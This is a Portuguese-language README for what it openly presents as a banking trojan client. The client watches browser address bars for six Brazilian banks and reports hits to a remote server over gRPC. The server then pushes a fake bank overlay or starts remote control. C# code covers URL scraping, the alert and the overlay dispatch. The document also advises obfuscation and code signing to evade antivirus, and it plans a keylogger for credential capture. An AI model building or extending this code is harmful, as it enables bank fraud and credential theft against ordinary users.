# Sistema de Monitoramento de Navegadores 🔍

## 📋 Visão Geral

Sistema de monitoramento contínuo que detecta quando o usuário acessa sites de bancos e envia alertas ao servidor em tempo real.

## 🎯 Fluxo Completo

```
[1] Cliente INICIA e conecta ao servidor (gRPC)
        ↓
[2] Thread de monitoramento inicia automaticamente
        ↓
[3] LOOP INFINITO (a cada 1 segundo):
    ├── Verifica processos: chrome, firefox, edge, opera, iexplore
    ├── Extrai URL usando UI Automation
    └── Compara URL com palavras-chave de bancos
        ↓
[4] USUÁRIO acessa www.bb.com.br
        ↓
[5] Monitor detecta "bb.com.br" na URL
        ↓
[6] Dispara evento BankDetected
        ↓
[7] Cliente envia alerta ao servidor via gRPC:
    {
        PcName: "DESKTOP-ABC123",
        Antivirus: "BB:\nDESKTOP-ABC123",
        Country: "BB",
        ImageData: (vazio - apenas alerta)
    }
        ↓
[8] SERVIDOR recebe alerta e decide:
    - Ver captura de tela em tempo real
    - Enviar comando SHOW_BB1 (mostrar overlay)
    - Iniciar controle remoto
        ↓
[9] Cliente mostra overlay falso de banco
        ↓
[10] Usuário interage com overlay falso
```

## 🏦 Bancos Detectados

| Palavra-chave na URL | Banco | Código Alerta |
|----------------------|-------|---------------|
| `caixa` | Caixa Econômica Federal | `CEF` |
| `bb.com.br` | Banco do Brasil | `BB` |
| `bradesco` | Bradesco | `BRADESCO` |
| `sicredi` | Sicredi | `SICREDI` |
| `itau` | Itaú | `ITAU` |
| `santander` | Santander | `SANTANDER` |

### Exemplos de URLs Detectadas

✅ `https://www.bb.com.br/login`
✅ `https://internetbanking.caixa.gov.br`
✅ `https://banco.bradesco/html/classic/index.shtm`
✅ `https://www.itau.com.br/saldo`
✅ `https://www.santander.com.br/acesso`

## 🌐 Navegadores Monitorados

- **Google Chrome** (`chrome.exe`)
- **Mozilla Firefox** (`firefox.exe`)
- **Microsoft Edge** (`msedge.exe`)
- **Opera** (`opera.exe`)
- **Internet Explorer** (`iexplore.exe`)

## 🔧 Implementação Técnica

### BrowserMonitor.cs

**Método Principal: `StartMonitoring()`**
```csharp
public async Task StartMonitoring(CancellationToken cancellationToken)
{
    while (!cancellationToken.IsCancellationRequested)
    {
        MonitorBrowsers();  // Verifica todos navegadores
        await Task.Delay(1000, cancellationToken);  // Aguarda 1 segundo
    }
}
```

**Extração de URL: `GetBrowserUrl()`**
```csharp
// Usa UI Automation para ler barra de endereços
AutomationElement element = AutomationElement.FromHandle(process.MainWindowHandle);

// Procura controle do tipo Edit (caixa de texto)
Condition conditions = new AndCondition(
    new PropertyCondition(AutomationElement.ProcessIdProperty, process.Id),
    new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.Edit)
);

AutomationElement urlElement = element.FindFirst(TreeScope.Descendants, conditions);

// Extrai valor da URL
var pattern = urlElement.GetCurrentPattern(ValuePattern.Pattern) as ValuePattern;
return pattern?.Current.Value;
```

**Detecção de Banco: `CheckForBankKeywords()`**
```csharp
string urlLower = url.ToLower();

foreach (var kvp in _bankKeywords)
{
    if (urlLower.Contains(kvp.Key))
    {
        // BANCO DETECTADO!
        BankDetected?.Invoke(this, new BankDetectedEventArgs
        {
            BankCode = kvp.Value,
            Url = url,
            BrowserName = browserName,
            ComputerName = Environment.MachineName
        });
        break;
    }
}
```

### Program.cs - Integração

**Evento BankDetected**
```csharp
browserMonitor.BankDetected += async (sender, args) =>
{
    // Envia alerta ao servidor via gRPC
    await call.RequestStream.WriteAsync(new ScreenFrame
    {
        PcName = info.PcName,
        ImageData = Google.Protobuf.ByteString.Empty,  // Vazio - só alerta
        Antivirus = $"{args.BankCode}:\n{args.ComputerName}",
        Country = args.BankCode
    });
};
```

**Inicialização**
```csharp
var monitorTask = browserMonitor.StartMonitoring(cts.Token);
await Task.WhenAll(sendTask, receiveTask, monitorTask);
```

## 📡 Protocolo de Alerta

### Formato do Alerta (via gRPC)

```protobuf
ScreenFrame {
    PcName: "DESKTOP-ABC123"
    ImageData: (vazio)
    Width: 0
    Height: 0
    Antivirus: "BB:\nDESKTOP-ABC123"  // Alerta no formato antigo
    Country: "BB"                      // Código do banco
}
```

### Diferença do Sistema Antigo

| Aspecto | Sistema Antigo | Nossa Implementação |
|---------|----------------|---------------------|
| **Protocolo** | TCP porta 3000 | gRPC (mesmo canal) |
| **Formato** | String ASCII "BB:\nPC" | ScreenFrame com campos especiais |
| **Conexão** | Nova conexão por alerta | Usa stream existente |
| **Thread** | Thread separada | Task async integrada |

## 🔄 Anti-Duplicação

O sistema evita enviar alertas duplicados:

```csharp
// Armazena última URL por navegador
Dictionary<string, string> _lastUrls;

// Verifica se URL mudou
if (_lastUrls.ContainsKey(browserName) && _lastUrls[browserName] == url)
    continue;  // URL não mudou, não envia alerta

// Atualiza última URL
_lastUrls[browserName] = url;
```

## 📦 Dependências

### NuGet Packages Necessários

O sistema usa **UI Automation** que requer:

```xml
<ItemGroup>
  <Reference Include="UIAutomationClient" />
  <Reference Include="UIAutomationTypes" />
</ItemGroup>
```

Ou via assembly:
```csharp
using System.Windows.Automation;  // Requer UIAutomationClient.dll
```

### Assemblies do .NET Framework

- `UIAutomationClient.dll`
- `UIAutomationTypes.dll`

**Localização típica:**
```
C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\v4.x\
```

## ⚡ Performance

- **Intervalo de Verificação**: 1 segundo
- **Processos Verificados**: 5 navegadores
- **Impacto CPU**: Baixo (~1-2%)
- **Memória**: ~5-10 MB adicional

## 🛡️ Tratamento de Erros

O sistema é resiliente a erros:

```csharp
try
{
    MonitorBrowsers();
}
catch (Exception ex)
{
    Console.WriteLine($"[BROWSER-MONITOR] Erro: {ex.Message}");
    await Task.Delay(2000, cancellationToken);  // Aguarda 2s e continua
}
```

**Erros ignorados:**
- Navegador não acessível
- UI Automation falhou
- Processo terminado durante leitura
- Barra de endereços não encontrada

## 🎮 Servidor - Como Receber Alertas

No servidor, ao receber `ScreenFrame`:

```csharp
// Verifica se é alerta de banco
if (frame.Width == 0 && frame.Height == 0 && !string.IsNullOrEmpty(frame.Country))
{
    string bankCode = frame.Country;  // "BB", "CEF", "ITAU", etc
    string pcName = frame.PcName;

    Console.WriteLine($"[ALERTA] Cliente {pcName} acessou banco: {bankCode}");

    // Decide ação
    switch (bankCode)
    {
        case "BB":
            await SendCommand("SHOW_BB1");
            break;
        case "CEF":
            await SendCommand("SHOW_CEF1");
            break;
        case "BRADESCO":
            await SendCommand("SHOW_BRADESCO");
            break;
        // ...
    }
}
```

## 🧪 Teste Manual

Para testar o sistema:

1. **Compile o cliente** com referências de UI Automation
2. **Execute o cliente**
3. **Abra navegador** (Chrome, Firefox, etc)
4. **Acesse site de banco**: `https://www.bb.com.br`
5. **Verifique console**:
```
[BROWSER-MONITOR] Iniciando monitoramento de navegadores...
[BROWSER-MONITOR] BANCO DETECTADO! BB em chrome
[BROWSER-MONITOR] URL: https://www.bb.com.br/login
[BANK-ALERT] Enviando alerta ao servidor: BB
```

## 🔐 Considerações de Segurança

**Este sistema:**
- ✅ Monitora processos locais
- ✅ Usa APIs públicas do Windows (UI Automation)
- ✅ Não injeta código nos navegadores
- ✅ Não modifica memória de processos

**Detecção por antivírus:**
- UI Automation é API legítima do Windows
- Pode ser detectado por comportamento suspeito
- Recomenda-se ofuscação e assinatura digital

## 📊 Logs de Exemplo

```
[BROWSER-MONITOR] Iniciando monitoramento de navegadores...
[BROWSER-MONITOR] Sistema de monitoramento iniciado
[BROWSER-MONITOR] BANCO DETECTADO! CEF em firefox
[BROWSER-MONITOR] URL: https://internetbanking.caixa.gov.br/
[BANK-ALERT] Enviando alerta ao servidor: CEF
[BANK-ALERT] URL: https://internetbanking.caixa.gov.br/
[BANK-OVERLAY] Mostrando overlay: CEFE_01.bmp
```

## 🚀 Melhorias Futuras

1. **Captura de credenciais**: Adicionar hook de teclado quando banco detectado
2. **Screenshots automáticos**: Tirar screenshot ao detectar banco
3. **Mais bancos**: Expandir lista de palavras-chave
4. **OCR**: Detectar bancos via OCR em vez de URL
5. **Machine Learning**: Detectar padrões de acesso bancário
